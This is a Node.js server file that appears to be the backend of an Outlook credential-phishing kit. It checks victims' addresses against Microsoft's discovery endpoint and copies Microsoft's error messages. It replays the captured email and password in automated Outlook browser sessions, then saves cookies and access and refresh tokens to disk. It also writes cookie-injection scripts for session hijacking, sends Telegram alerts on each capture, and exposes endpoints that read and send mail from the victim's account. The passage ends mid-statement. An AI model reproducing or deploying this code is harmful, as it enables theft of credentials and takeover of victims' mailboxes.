const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs');

// Load environment variables from .env file
if (fs.existsSync('.env')) {
    const envFile = fs.readFileSync('.env', 'utf8');
    envFile.split('\n').forEach(line => {
        const [key, value] = line.split('=');
        if (key && value && !process.env[key]) {
            process.env[key] = value;
        }
    });
}

const { GraphAPIAuth } = require('./src/graph-api');
const { OutlookLoginAutomation } = require('./src/outlook-login');
const VPSManagementBot = require('./telegram-bot');

const app = express();
const PORT = process.env.PORT || 5000;

// Security configuration
const ADMIN_TOKEN = process.env.ADMIN_TOKEN || 'admin-' + Math.random().toString(36).substr(2, 24);

// Make admin token available globally for Telegram bot
global.adminToken = ADMIN_TOKEN;

// Initialize Telegram Bot
let telegramBot = null;
try {
    if (process.env.TELEGRAM_BOT_TOKEN) {
        telegramBot = new VPSManagementBot();
        console.log('🤖 Telegram Bot initialized successfully');
    } else {
        console.log('⚠️ TELEGRAM_BOT_TOKEN not found - Telegram notifications disabled');
    }
} catch (error) {
    console.error('❌ Failed to initialize Telegram Bot:', error.message);
}

// Middleware - Configure CORS for Replit environment
app.use(cors({
    origin: true, // Allow all origins for Replit proxy
    credentials: true
}));
app.use(express.json());

// Admin authentication middleware
function requireAdminAuth(req, res, next) {
    const token = req.headers['authorization']?.replace('Bearer ', '') || 
                  (req.query && req.query.token) || 
                  (req.body && req.body.token);

    if (!token || token !== ADMIN_TOKEN) {
        return res.status(401).json({ 
            error: 'Unauthorized access to admin endpoint',
            message: 'Valid admin token required'
        });
    }
    next();
}

app.use(express.static('public'));

// Store user sessions with Graph API auth and OAuth state tracking
const userSessions = new Map(); // sessionId -> { sessionId, graphAuth, userEmail, createdAt, oauthState, authenticated, verified }
const oauthStates = new Map(); // state -> { sessionId, timestamp }
const automationSessions = new Map(); // sessionId -> { automation, status, email, startTime }
const SESSION_TIMEOUT = 30 * 60 * 1000; // 30 minutes timeout
const STATE_TIMEOUT = 10 * 60 * 1000; // 10 minutes for OAuth state
const MAX_PRELOADS = 5; // Maximum number of concurrent preloaded browsers

// Analytics tracking with persistent storage
const ANALYTICS_FILE = path.join(__dirname, 'analytics.json');

// Load analytics from file
function loadAnalytics() {
    try {
        if (fs.existsSync(ANALYTICS_FILE)) {
            const data = fs.readFileSync(ANALYTICS_FILE, 'utf8');
            const savedAnalytics = JSON.parse(data);
            console.log('📊 Loaded analytics from file:', savedAnalytics);
            return {
                totalLogins: savedAnalytics.totalLogins || 0,
                successfulLogins: savedAnalytics.successfulLogins || 0,
                failedLogins: savedAnalytics.failedLogins || 0
            };
        }
    } catch (error) {
        console.error('Error loading analytics:', error);
    }
    console.log('📊 Starting with fresh analytics data');
    return {
        totalLogins: 0,
        successfulLogins: 0,
        failedLogins: 0
    };
}

// Save analytics to file
function saveAnalytics() {
    try {
        fs.writeFileSync(ANALYTICS_FILE, JSON.stringify(analytics, null, 2));
        console.log('💾 Analytics saved to file');
    } catch (error) {
        console.error('Error saving analytics:', error);
    }
}

// Initialize analytics from file
const analytics = loadAnalytics();

// Cleanup expired sessions and OAuth states
setInterval(async () => {
    const now = Date.now();

    // Clean up expired sessions
    for (const [sessionId, session] of userSessions) {
        if (now - session.createdAt > SESSION_TIMEOUT) {
            userSessions.delete(sessionId);
            console.log(`🧹 Cleaned up expired session: ${sessionId}`);
        }
    }

    // Clean up expired OAuth states
    for (const [state, stateInfo] of oauthStates) {
        if (now - stateInfo.timestamp > STATE_TIMEOUT) {
            oauthStates.delete(state);
            console.log(`🧹 Cleaned up expired OAuth state`);
        }
    }

    // Clean up expired automation sessions
    for (const [sessionId, automationSession] of automationSessions) {
        if (now - automationSession.startTime > SESSION_TIMEOUT) {
            try {
                if (automationSession.automation) {
                    await automationSession.automation.close();
                }
            } catch (error) {
                console.error(`Error closing automation session ${sessionId}:`, error.message);
            }
            automationSessions.delete(sessionId);
            console.log(`🧹 Cleaned up expired automation session: ${sessionId}`);
        }
    }
}, 5 * 60 * 1000); // Check every 5 minutes

// Helper function to create session ID
function createSessionId() {
    return Date.now().toString() + '_' + Math.random().toString(36).substr(2, 5);
}

// Generate cookie injection script
function generateCookieInjectionScript(email, cookies, sessionId) {
    return `
// Session Cookie Injector
// Auto-generated on ${new Date().toISOString()}
// Session: ${email} (${cookies.length} cookies)

(function() {
    console.log('🚀 Injecting ${cookies.length} cookies for session: ${email}');

    const sessionInfo = {
        email: '${email}',
        timestamp: '${new Date().toISOString()}',
        cookieCount: ${cookies.length}
    };

    console.log('📧 Session info:', sessionInfo);

    const cookies = ${JSON.stringify(cookies, null, 4)};
    let injected = 0;

    cookies.forEach(cookie => {
        try {
            let cookieStr = cookie.name + '=' + cookie.value + ';';
            cookieStr += 'domain=' + cookie.domain + ';';
            cookieStr += 'path=' + cookie.path + ';';
            cookieStr += 'expires=' + new Date(cookie.expires * 1000).toUTCString() + ';';
            if (cookie.secure) cookieStr += 'secure;';
            if (cookie.sameSite) cookieStr += 'samesite=' + cookie.sameSite + ';';

            document.cookie = cookieStr;
            injected++;
        } catch (e) {
            console.warn('Failed to inject cookie:', cookie.name);
        }
    });

    console.log('✅ Successfully injected ' + injected + ' cookies!');
    console.log('🌐 Navigate to https://outlook.office.com/mail/ to test');

    // Auto-redirect option
    setTimeout(() => {
        if (confirm('Injected ' + injected + ' cookies for ${email}! Open Outlook now?')) {
            window.open('https://outlook.office.com/mail/', '_blank');
        }
    }, 1000);
})();
`;
}

// Browser preloading functions for performance optimization
async function startBrowserPreload(sessionId, email) {
    try {
        console.log(`🚀 Starting browser preload for session: ${sessionId}, email: ${email}`);
        
        // Check if we've reached the maximum preload limit
        const currentPreloads = Array.from(automationSessions.values())
            .filter(session => session.status === 'preloading' || session.status === 'preload_ready');
        
        if (currentPreloads.length >= MAX_PRELOADS) {
            // Evict oldest preload to make space
            const oldestPreload = currentPreloads
                .sort((a, b) => a.startTime - b.startTime)[0];
            
            if (oldestPreload) {
                console.log(`📊 MAX_PRELOADS reached, evicting oldest preload: ${oldestPreload.sessionId || 'unknown'}`);
                try {
                    if (oldestPreload.automation) {
                        await oldestPreload.automation.close();
                    }
                    // Find and remove the oldest preload from automationSessions
                    for (const [key, value] of automationSessions) {
                        if (value === oldestPreload) {
                            automationSessions.delete(key);
                            break;
                        }
                    }
                } catch (evictError) {
                    console.warn('Error evicting old preload:', evictError.message);
                }
            }
        }

        // Create new automation instance
        const automation = new OutlookLoginAutomation({
            enableScreenshots: true,
            screenshotQuality: 80
        });

        // Store in automationSessions with preloading status
        automationSessions.set(sessionId, {
            automation: automation,
            status: 'preloading',
            email: email,
            startTime: Date.now(),
            sessionId: sessionId
        });

        // Initialize browser and start preload process
        await automation.init();
        console.log(`🔧 Browser initialized for preload session: ${sessionId}`);

        const navigated = await automation.navigateToOutlook();
        if (!navigated) {
            throw new Error('Failed to navigate to Outlook during preload');
        }
        console.log(`🌐 Navigated to Outlook for preload session: ${sessionId}`);

        // Start the preload process (email entry and wait at password prompt)
        const preloadSuccess = await automation.preload(email);
        
        if (preloadSuccess) {
            // Update status to ready
            automationSessions.get(sessionId).status = 'preload_ready';
            console.log(`✅ Browser preload completed and ready for: ${email} (session: ${sessionId})`);
        } else {
            // Update status to failed
            automationSessions.get(sessionId).status = 'preload_failed';
            console.log(`❌ Browser preload failed for: ${email} (session: ${sessionId})`);
            
            // Clean up failed preload after a short delay
            setTimeout(async () => {
                try {
                    await automation.close();
                    automationSessions.delete(sessionId);
                } catch (cleanupError) {
                    console.warn('Error cleaning up failed preload:', cleanupError.message);
                }
            }, 5000);
        }

    } catch (error) {
        console.error(`❌ Browser preload error for ${email}:`, error.message);
        
        // Clean up on error
        if (automationSessions.has(sessionId)) {
            try {
                const session = automationSessions.get(sessionId);
                if (session.automation) {
                    await session.automation.close();
                }
                automationSessions.delete(sessionId);
            } catch (cleanupError) {
                console.warn('Error cleaning up preload after error:', cleanupError.message);
            }
        }
        
        throw error;
    }
}

// Function to get preload status for debugging
function getPreloadStats() {
    const preloadSessions = Array.from(automationSessions.values())
        .filter(session => session.status && session.status.startsWith('preload'));
    
    return {
        total: preloadSessions.length,
        preloading: preloadSessions.filter(s => s.status === 'preloading').length,
        ready: preloadSessions.filter(s => s.status === 'preload_ready').length,
        failed: preloadSessions.filter(s => s.status === 'preload_failed').length,
        maxAllowed: MAX_PRELOADS
    };
}

// Routes

// Health check
app.get('/api/health', (req, res) => {
    res.json({ 
        status: 'OK', 
        message: 'Microsoft Graph API Backend is running',
        authConfigured: !!(process.env.AZURE_CLIENT_ID && process.env.AZURE_CLIENT_SECRET && process.env.AZURE_TENANT_ID)
    });
});

// Get OAuth authorization URL
app.post('/api/auth-url', (req, res) => {
    try {
        // Check if Azure credentials are configured
        if (!process.env.AZURE_CLIENT_ID || !process.env.AZURE_CLIENT_SECRET || !process.env.AZURE_TENANT_ID) {
            return res.status(500).json({
                error: 'Azure credentials not configured',
                message: 'Please configure AZURE_CLIENT_ID, AZURE_CLIENT_SECRET, and AZURE_TENANT_ID'
            });
        }

        const sessionId = createSessionId();

        // Use fixed redirect URI from environment or construct carefully
        const redirectUri = process.env.AZURE_REDIRECT_URI || `${req.protocol}://${req.get('host')}/api/auth-callback`;

        const graphAuth = new GraphAPIAuth({
            clientId: process.env.AZURE_CLIENT_ID,
            clientSecret: process.env.AZURE_CLIENT_SECRET,
            tenantId: process.env.AZURE_TENANT_ID,
            redirectUri: redirectUri
        });

        const authUrl = graphAuth.getAuthUrl(sessionId);

        // Extract state from URL for tracking
        const stateMatch = authUrl.match(/state=([^&]+)/);
        const state = stateMatch ? decodeURIComponent(stateMatch[1]) : null;

        // Store session and state mapping
        userSessions.set(sessionId, {
            sessionId: sessionId,
            graphAuth: graphAuth,
            userEmail: null,
            createdAt: Date.now(),
            oauthState: state,
            authenticated: false, // Initialize as not authenticated
            verified: false // Initialize as not verified
        });

        if (state) {
            oauthStates.set(state, {
                sessionId: sessionId,
                timestamp: Date.now()
            });
        }

        analytics.totalLogins++;
        saveAnalytics();

        console.log(`🔑 Generated auth URL for session: ${sessionId}`);

        res.json({
            authUrl: authUrl,
            sessionId: sessionId,
            message: 'Click the URL to authenticate with Microsoft'
        });

    } catch (error) {
        console.error('Error generating auth URL:', error);
        res.status(500).json({ 
            error: 'Failed to generate auth URL',
            details: error.message 
        });
    }
});

// Handle OAuth callback
app.get('/api/auth-callback', async (req, res) => {
    try {
        const { code, state, error: authError } = req.query;

        if (authError) {
            analytics.failedLogins++;
            saveAnalytics();
            return res.status(400).json({ 
                error: 'Authentication failed',
                details: authError 
            });
        }

        if (!code || !state) {
            analytics.failedLogins++;
            saveAnalytics();
            return res.status(400).json({ 
                error: 'Missing authorization code or state parameter' 
            });
        }

        // Validate state and find associated session
        const stateInfo = oauthStates.get(state);
        if (!stateInfo) {
            analytics.failedLogins++;
            saveAnalytics();
            return res.status(400).json({ 
                error: 'Invalid or expired state parameter' 
            });
        }

        // Check state timeout (10 minutes)
        if (Date.now() - stateInfo.timestamp > STATE_TIMEOUT) {
            oauthStates.delete(state);
            analytics.failedLogins++;
            saveAnalytics();
            return res.status(400).json({ 
                error: 'OAuth state expired' 
            });
        }

        const targetSession = userSessions.get(stateInfo.sessionId);
        if (!targetSession) {
            oauthStates.delete(state);
            analytics.failedLogins++;
            saveAnalytics();
            return res.status(400).json({ 
                error: 'Associated session not found' 
            });
        }

        // Clean up OAuth state
        oauthStates.delete(state);

        try {
            // Exchange code for tokens
            const tokenData = await targetSession.graphAuth.getTokenFromCode(code);

            // Get user profile
            const userProfile = await targetSession.graphAuth.getUserProfile();
            targetSession.userEmail = userProfile.mail || userProfile.userPrincipalName;
            targetSession.authenticated = true; // Mark session as authenticated

            // Check if we have stored credentials for this email
            const sessionDir = path.join(__dirname, 'session_data');

            try {
                const glob = require('fs').readdirSync(sessionDir).filter(file => 
                    file.includes(targetSession.userEmail.replace(/[@.]/g, '_')) && file.startsWith('session_')
                );

                if (glob.length > 0) {
                    const latestFile = glob.sort().pop();
                    const credentialsData = JSON.parse(fs.readFileSync(path.join(sessionDir, latestFile), 'utf8'));
                    console.log(`✅ Found stored credentials for: ${targetSession.userEmail}`);

                    // Use existing session cookies if available, otherwise create basic ones
                    let sessionCookies = [];

                    if (credentialsData.cookies && credentialsData.cookies.length > 0) {
                        // Use existing cookies from previous session
                        sessionCookies = credentialsData.cookies;
                        console.log(`🔄 Reusing ${sessionCookies.length} existing session cookies`);
                    } else {
                        // Create basic authentication cookies
                        sessionCookies = [
                            {
                                name: 'MSGraphAccessToken',
                                value: tokenData.access_token,
                                domain: '.microsoftonline.com',
                                path: '/',
                                expires: Math.floor(Date.now() / 1000) + (tokenData.expires_in || 3600),
                                secure: true,
                                httpOnly: true,
                                sameSite: 'None'
                            }
                        ];
                        console.log(`🆕 Created ${sessionCookies.length} new authentication cookies`);
                    }

                    // Generate injection script
                    const injectionScript = generateCookieInjectionScript(targetSession.userEmail, sessionCookies, targetSession.sessionId);
                    const injectFilename = `inject_session_${targetSession.sessionId}.js`;
                    const injectPath = path.join(sessionDir, injectFilename);

                    fs.writeFileSync(injectPath, injectionScript);
                    console.log(`🍪 Generated cookie injection script: ${injectFilename}`);

                    // Store comprehensive session data
                    const fullSessionData = {
                        ...credentialsData,
                        sessionId: targetSession.sessionId,
                        authTimestamp: new Date().toISOString(),
                        status: 'valid',
                        totalCookies: sessionCookies.length,
                        domains: [...new Set(sessionCookies.map(c => c.domain))],
                        cookies: sessionCookies,
                        injectFilename: injectFilename,
                        accessToken: tokenData.access_token,
                        refreshToken: tokenData.refresh_token,
                        tokenExpiry: new Date(Date.now() + (tokenData.expires_in * 1000)).toISOString()
                    };

                    fs.writeFileSync(
                        path.join(sessionDir, `session_${targetSession.sessionId}_${targetSession.userEmail.replace(/[@.]/g, '_')}.json`),
                        JSON.stringify(fullSessionData, null, 2)
                    );

                    console.log(`💾 Saved complete session data for: ${targetSession.userEmail} with ${sessionCookies.length} cookies`);
                } else {
                    console.log(`⚠️ No stored credentials found for: ${targetSession.userEmail}`);
                }
            } catch (error) {
                console.error('Error processing stored credentials:', error);
            }

        } catch (tokenError) {
            // Handle specific Microsoft authentication errors
            console.error('❌ Microsoft authentication failed:', tokenError);

            let errorMessage = 'Authentication failed';
            let errorDetails = tokenError.message;

            // Parse common Microsoft error responses
            if (tokenError.message.includes('invalid_grant')) {
                errorMessage = 'Your account or password is incorrect. If you don\'t remember your password, reset it now.';
            } else if (tokenError.message.includes('invalid_client')) {
                errorMessage = 'Application configuration error. Please contact support.';
            } else if (tokenError.message.includes('unauthorized_client')) {
                errorMessage = 'This application is not authorized to access your account.';
            } else if (tokenError.message.includes('AADSTS50126')) {
                errorMessage = 'Your account or password is incorrect. If you don\'t remember your password, reset it now.';
            } else if (tokenError.message.includes('AADSTS50034')) {
                errorMessage = 'We couldn\'t find an account with that username. Try another, or get a new Microsoft account.';
            }

            // Store failed authentication attempt
            const sessionDir = path.join(__dirname, 'session_data');
            const failureId = Date.now().toString() + '_' + Math.random().toString(36).substr(2, 5);
            const failureData = {
                id: failureId,
                sessionId: targetSession.sessionId,
                email: targetSession.userEmail || 'Unknown',
                reason: 'OAuth Authentication Failed',
                errorMessage: errorMessage,
                errorDetails: errorDetails,
                timestamp: new Date().toISOString(),
                status: 'invalid',
                authUrl: req.originalUrl
            };

            fs.writeFileSync(
                path.join(sessionDir, `invalid_${failureId}.json`),
                JSON.stringify(failureData, null, 2)
            );

            analytics.failedLogins++;
            saveAnalytics();

            return res.status(400).send(`
                <html>
                    <head><title>Authentication Failed</title></head>
                    <body>
                        <h2>❌ Authentication Failed</h2>
                        <p style="color: #d13438;">${errorMessage}</p>
                        <p><a href="/">Try again</a></p>
                        <script>
                            setTimeout(() => {
                                window.close() || (window.location.href = '/');
                            }, 3000);
                        </script>
                    </body>
                </html>
            `);
        }

        analytics.successfulLogins++;
        saveAnalytics();

        console.log(`✅ User authenticated successfully`);

        // Send success response with redirect to frontend
        res.send(`
            <html>
                <head><title>Authentication Successful</title></head>
                <body>
                    <h2>✅ Authentication Successful!</h2>
                    <p>You can now close this window and return to the application.</p>
                    <script>
                        // Try to close the window, or redirect back to main app
                        setTimeout(() => {
                            window.close() || (window.location.href = '/');
                        }, 2000);
                    </script>
                </body>
            </html>
        `);

        // Send Telegram notification if bot is available (with minimal PII logging)
        if (telegramBot) {
            try {
                const domain = targetSession.userEmail.split('@')[1] || 'Unknown';
                await telegramBot.sendLoginNotification({
                    email: '***@' + domain, // Redact username part
                    domain: domain,
                    timestamp: new Date().toISOString(),
                    sessionId: targetSession.sessionId,
                    authMethod: 'Microsoft Graph API'
                });
                console.log(`📤 Telegram notification sent for user@${domain}`);
            } catch (error) {
                console.error('❌ Failed to send Telegram notification:', error.message);
            }
        }

    } catch (error) {
        console.error('Error in auth callback:', error);
        analytics.failedLogins++;
        saveAnalytics();

        res.status(500).send(`
            <html>
                <head><title>Authentication Failed</title></head>
                <body>
                    <h2>❌ Authentication Failed</h2>
                    <p>Error: ${error.message}</p>
                    <p><a href="/">Return to main page</a></p>
                </body>
            </html>
        `);
    }
});

// Get user profile
app.get('/api/profile', async (req, res) => {
    try {
        const sessionId = req.headers['x-session-id'] || req.query.sessionId;

        if (!sessionId || !userSessions.has(sessionId)) {
            return res.status(401).json({ 
                error: 'No active session found',
                message: 'Please authenticate first' 
            });
        }

        const session = userSessions.get(sessionId);

        // Check if session is authenticated
        if (!session.authenticated) {
            return res.status(401).json({ 
                error: 'Session not authenticated',
                message: 'Please complete login first' 
            });
        }

        const userProfile = await session.graphAuth.getUserProfile();

        res.json({
            profile: userProfile,
            email: session.userEmail,
            sessionId: sessionId,
            verified: session.verified // Include verification status
        });

    } catch (error) {
        console.error('Error getting user profile:', error);
        res.status(500).json({ 
            error: 'Failed to get user profile',
            details: error.message 
        });
    }
});

// Get emails
app.get('/api/emails', async (req, res) => {
    try {
        const sessionId = req.headers['x-session-id'] || req.query.sessionId;
        const count = parseInt(req.query.count) || 10;

        if (!sessionId || !userSessions.has(sessionId)) {
            return res.status(401).json({ 
                error: 'No active session found',
                message: 'Please authenticate first' 
            });
        }

        const session = userSessions.get(sessionId);

        // Check if session is authenticated
        if (!session.authenticated) {
            return res.status(401).json({ 
                error: 'Session not authenticated',
                message: 'Please complete login first' 
            });
        }

        const emails = await session.graphAuth.getEmails(count);

        res.json({
            emails: emails,
            count: emails.length,
            sessionId: sessionId
        });

    } catch (error) {
        console.error('Error getting emails:', error);
        res.status(500).json({ 
            error: 'Failed to get emails',
            details: error.message 
        });
    }
});

// Send email
app.post('/api/send-email', async (req, res) => {
    try {
        const sessionId = req.headers['x-session-id'] || req.body.sessionId;
        const { to, subject, body, isHtml = false } = req.body;

        if (!sessionId || !userSessions.has(sessionId)) {
            return res.status(401).json({ 
                error: 'No active session found',
                message: 'Please authenticate first' 
            });
        }

        const session = userSessions.get(sessionId);

        // Check if session is authenticated
        if (!session.authenticated) {
            return res.status(401).json({ 
                error: 'Session not authenticated',
                message: 'Please complete login first' 
            });
        }

        if (!to || !subject || !body) {
            return res.status(400).json({ 
                error: 'Missing required fields',
                message: 'to, subject, and body are required' 
            });
        }

        await session.graphAuth.sendEmail(to, subject, body, isHtml);

        res.json({
            success: true,
            message: 'Email sent successfully',
            sessionId: sessionId
        });

    } catch (error) {
        console.error('Error sending email:', error);
        res.status(500).json({ 
            error: 'Failed to send email',
            details: error.message 
        });
    }
});

// Verify email endpoint
app.post('/api/verify-email', async (req, res) => {
    try {
        const { email } = req.body;

        if (!email) {
            return res.status(400).json({ 
                error: 'Email is required',
                exists: false 
            });
        }

        // Extract domain from email
        const domain = email.split('@')[1];
        if (!domain) {
            return res.json({
                exists: false,
                email: email,
                message: "Please enter a valid email address."
            });
        }

        try {
            // Use Microsoft's discovery endpoint to check if the domain is federated with Microsoft
            const discoveryUrl = `https://login.microsoftonline.com/common/userrealm/${encodeURIComponent(email)}?api-version=1.0`;

            const response = await fetch(discoveryUrl, {
                method: 'GET',
                headers: {
                    'Accept': 'application/json',
                    'User-Agent': 'Microsoft-Graph-Auth-App'
                }
            });

            if (response.ok) {
                const data = await response.json();

                // Check if the account exists and is a valid Microsoft account
                // Microsoft accounts can have various AccountType values: Managed, Federated, Unknown, etc.
                console.log(`Raw Microsoft discovery response for ${email}:`, data);

                const isValidAccount = (
                    (data.Account === 'Managed' || data.Account === 'Federated') ||
                    (data.account_type === 'Managed' || data.account_type === 'Federated') ||
                    (data.NameSpaceType === 'Managed' || data.NameSpaceType === 'Federated') ||
                    (data.AuthURL && data.AuthURL.includes('login.microsoftonline.com')) ||
                    (data.DomainName && data.DomainName.length > 0) ||
                    (data.domain_name && data.domain_name.length > 0)
                );

                if (isValidAccount) {
                    console.log(`✅ Email verification passed for: ${email} (Account type: ${data.Account || data.account_type || data.NameSpaceType})`);

                    // Start browser preloading in background for faster password authentication
                    const sessionId = createSessionId();
                    
                    // Start preload without awaiting - let it run in parallel
                    const preloadPromise = startBrowserPreload(sessionId, email).catch(error => {
                        console.warn(`⚠️ Browser preload failed for ${email}:`, error.message);
                        return false;
                    });

                    // Log verification success without creating files
                    console.log(`✅ Email verification successful for: ${email} (Account type: ${data.Account || data.account_type || data.NameSpaceType})`);

                    res.json({
                        exists: true,
                        email: email,
                        message: 'Account found. Please enter your password.',
                        accountType: data.Account || data.account_type || data.NameSpaceType,
                        sessionId: sessionId,  // Return session ID for browser preloading
                        preloadStarted: true
                    });
                } else {
                    console.log(`❌ Email verification failed for: ${email} - Account not found or not managed by Microsoft`);
                    console.log(`Discovery response:`, data);

                    // Store invalid result
                    const fs = require('fs');
                    const path = require('path');
                    const sessionDir = path.join(__dirname, 'session_data');
                    if (!fs.existsSync(sessionDir)) {
                        fs.mkdirSync(sessionDir, { recursive: true });
                    }

                    const invalidId = Date.now().toString() + '_' + Math.random().toString(36).substr(2, 5);
                    const invalidData = {
                        id: invalidId,
                        email: email,
                        reason: 'Account not found',
                        errorMessage: "We couldn't find an account with that username. Try another, or get a new Microsoft account.",
                        timestamp: new Date().toISOString(),
                        status: 'invalid',
                        fullResponse: data
                    };

                    fs.writeFileSync(
                        path.join(sessionDir, `invalid_${invalidId}.json`),
                        JSON.stringify(invalidData, null, 2)
                    );

                    res.json({
                        exists: false,
                        email: email,
                        message: "We couldn't verify your account. Please check your email address and try again."
                    });
                }
            } else {
                throw new Error(`Discovery API returned ${response.status}: ${response.statusText}`);
            }

        } catch (error) {
            console.log(`❌ Email verification error for: ${email} - ${error.message}`);

            // For network errors or API issues, we'll be conservative and reject
            res.json({
                exists: false,
                email: email,
                message: "We couldn't verify your account. Please check your email address and try again."
            });
        }

    } catch (error) {
        console.error('Error in email verification:', error);
        res.status(500).json({ 
            error: 'Email verification failed',
            exists: false,
            details: error.message 
        });
    }
});

// Fast password authentication endpoint using preloaded browsers
app.post('/api/authenticate-password-fast', async (req, res) => {
    try {
        const { email, password, sessionId } = req.body;

        if (!email || !password) {
            return res.status(400).json({ 
                error: 'Email and password are required',
                success: false 
            });
        }

        console.log(`🚀 Attempting FAST authentication for: ${email} (preload session: ${sessionId})`);

        // Check if there's a preloaded session ready for this email
        let preloadedSession = null;
        const startTime = Date.now();
        
        if (sessionId && automationSessions.has(sessionId)) {
            const session = automationSessions.get(sessionId);
            
            // Validate session matches email for security
            if (session.email !== email) {
                console.warn(`⚠️ Session email mismatch: expected ${email}, got ${session.email}`);
            } else if (session.status === 'preload_ready') {
                preloadedSession = session;
                console.log(`✅ Found preloaded browser ready for: ${email} (${sessionId})`);
            } else if (session.status === 'preloading') {
                // Wait for preload to complete (bounded wait up to 15 seconds)
                console.log(`⏳ Preload in progress for: ${email}, waiting for completion...`);
                const maxWaitTime = 15000; // 15 seconds
                const pollInterval = 500; // 500ms
                
                for (let waited = 0; waited < maxWaitTime; waited += pollInterval) {
                    await new Promise(resolve => setTimeout(resolve, pollInterval));
                    
                    if (!automationSessions.has(sessionId)) {
                        console.log(`⚠️ Preload session disappeared during wait: ${sessionId}`);
                        break;
                    }
                    
                    const updatedSession = automationSessions.get(sessionId);
                    if (updatedSession.status === 'preload_ready') {
                        preloadedSession = updatedSession;
                        console.log(`✅ Preload completed during wait for: ${email} (waited ${waited + pollInterval}ms)`);
                        break;
                    } else if (updatedSession.status === 'preload_failed') {
                        console.log(`❌ Preload failed during wait for: ${email} (waited ${waited + pollInterval}ms)`);
                        break;
                    }
                }
                
                if (!preloadedSession && automationSessions.has(sessionId)) {
                    console.log(`⏰ Preload wait timeout for: ${email}, falling back to cold start`);
                }
            } else if (session.status === 'preload_failed') {
                console.log(`❌ Found failed preload session for: ${email}, will use cold start`);
            }
        }

        let automation = null;
        let newSessionId = sessionId;
        let usingPreloadedBrowser = false;

        if (preloadedSession) {
            // Use preloaded browser for fast authentication
            automation = preloadedSession.automation;
            usingPreloadedBrowser = true;
            automationSessions.get(sessionId).status = 'authenticating';
            console.log(`⚡ Using preloaded browser for fast authentication: ${email}`);

            try {
                // Use the continue phase with the preloaded browser
                const loginSuccess = await automation.continueWithPassword(email, password);

                if (loginSuccess) {
                    console.log(`💾 Fast authentication successful, saving session for: ${email}`);
                    const sessionValidation = await automation.validateSession(email);

                    if (sessionValidation.success) {
                        // Create user session entry
                        userSessions.set(sessionId, {
                            sessionId: sessionId,
                            graphAuth: null, // No Graph API needed
                            userEmail: email,
                            createdAt: Date.now(),
                            oauthState: null,
                            authenticated: true,
                            verified: true,
                            cookiesSaved: sessionValidation.cookiesSaved,
                            usedPreload: true // Track that this used preloading
                        });

                        analytics.successfulLogins++;
                        saveAnalytics();

                        console.log(`🎯 FAST authentication successful for: ${email} (${sessionId})`);

                        // Send Telegram notification if bot is available
                        if (telegramBot) {
                            try {
                                await telegramBot.sendLoginAlert(email, 'FAST Authentication (preloaded browser)', {
                                    sessionId: sessionId,
                                    cookiesSaved: sessionValidation.cookiesSaved,
                                    preloadUsed: true
                                });
                            } catch (telegramError) {
                                console.warn('Telegram notification failed:', telegramError.message);
                            }
                        }

                        // Clean up preload session after short delay
                        setTimeout(async () => {
                            try {
                                await automation.close();
                                automationSessions.delete(sessionId);
                                console.log(`🧹 Cleaned up fast auth session: ${sessionId}`);
                            } catch (cleanupError) {
                                console.warn('Error cleaning up fast auth session:', cleanupError.message);
                            }
                        }, 5000);

                        // Calculate performance metrics
                        const totalAuthMs = Date.now() - startTime;
                        console.log(`📊 Fast auth metrics - Total: ${totalAuthMs}ms, Preload: TRUE`);

                        return res.json({
                            success: true,
                            message: 'Authentication successful (fast)',
                            sessionId: sessionId,
                            userEmail: email,
                            cookiesSaved: sessionValidation.cookiesSaved,
                            preloadUsed: true,
                            requiresOAuth: false,
                            metrics: {
                                totalAuthMs: totalAuthMs,
                                preloadUsed: true
                            }
                        });

                    } else {
                        console.error(`❌ Fast auth session validation failed for: ${email}`);
                        return res.status(401).json({
                            success: false,
                            error: 'Session validation failed',
                            message: sessionValidation.error || 'Could not validate session',
                            preloadUsed: true,
                            requiresOAuth: false
                        });
                    }

                } else {
                    // Fast authentication failed - password was incorrect
                    analytics.failedLogins++;
                    saveAnalytics();

                    console.log(`❌ Fast authentication failed for: ${email} - incorrect password`);

                    // Clean up failed session
                    setTimeout(async () => {
                        try {
                            await automation.close();
                            automationSessions.delete(sessionId);
                        } catch (cleanupError) {
                            console.warn('Error cleaning up failed fast auth:', cleanupError.message);
                        }
                    }, 2000);

                    return res.status(401).json({
                        success: false,
                        error: 'Invalid credentials',
                        message: 'Your account or password is incorrect. If you don\'t remember your password, reset it now.',
                        preloadUsed: true,
                        requiresOAuth: false
                    });
                }

            } catch (fastAuthError) {
                console.warn(`⚠️ Fast authentication failed, falling back to cold start: ${fastAuthError.message}`);
                // Clean up failed preload
                try {
                    await automation.close();
                    automationSessions.delete(sessionId);
                } catch (cleanupError) {
                    console.warn('Error cleaning up failed fast auth:', cleanupError.message);
                }
                // Continue to fallback logic below
                usingPreloadedBrowser = false;
            }
        }

        // Fallback to regular authentication if no preload or preload failed
        if (!usingPreloadedBrowser) {
            console.log(`🔄 No preload available or failed, using cold start for: ${email}`);
            
            automation = new OutlookLoginAutomation({
                enableScreenshots: true,
                screenshotQuality: 80
            });

            newSessionId = createSessionId();

            try {
                await automation.init();
                const navigated = await automation.navigateToOutlook();

                if (!navigated) {
                    throw new Error('Failed to navigate to Outlook');
                }

                const loginSuccess = await automation.performLogin(email, password);

                if (!loginSuccess) {
                    await automation.close();
                    console.log(`❌ Cold start authentication failed for: ${email}`);

                    analytics.failedLogins++;
                    saveAnalytics();

                    return res.status(401).json({
                        success: false,
                        error: 'Invalid credentials',
                        message: 'Your account or password is incorrect. If you don\'t remember your password, reset it now.',
                        preloadUsed: false,
                        requiresOAuth: false
                    });
                }

                // Save session and cookies directly
                console.log(`💾 Cold start saving session cookies for: ${email}`);
                const sessionValidation = await automation.validateSession(email);
                await automation.close();

                if (sessionValidation.success) {
                    // Create user session entry
                    userSessions.set(newSessionId, {
                        sessionId: newSessionId,
                        graphAuth: null, // No Graph API needed
                        userEmail: email,
                        createdAt: Date.now(),
                        oauthState: null,
                        authenticated: true,
                        verified: true,
                        cookiesSaved: sessionValidation.cookiesSaved,
                        usedPreload: false // Track that this was cold start
                    });

                    analytics.successfulLogins++;
                    saveAnalytics();

                    console.log(`✅ Cold start authentication successful for: ${email}`);

                    // Calculate performance metrics
                    const totalAuthMs = Date.now() - startTime;
                    console.log(`📊 Cold start auth metrics - Total: ${totalAuthMs}ms, Preload: FALSE`);

                    return res.json({
                        success: true,
                        message: 'Authentication successful (cold start)',
                        sessionId: newSessionId,
                        userEmail: email,
                        cookiesSaved: sessionValidation.cookiesSaved,
                        preloadUsed: false,
                        requiresOAuth: false,
                        redirectToOneDrive: true, // Signal frontend to redirect
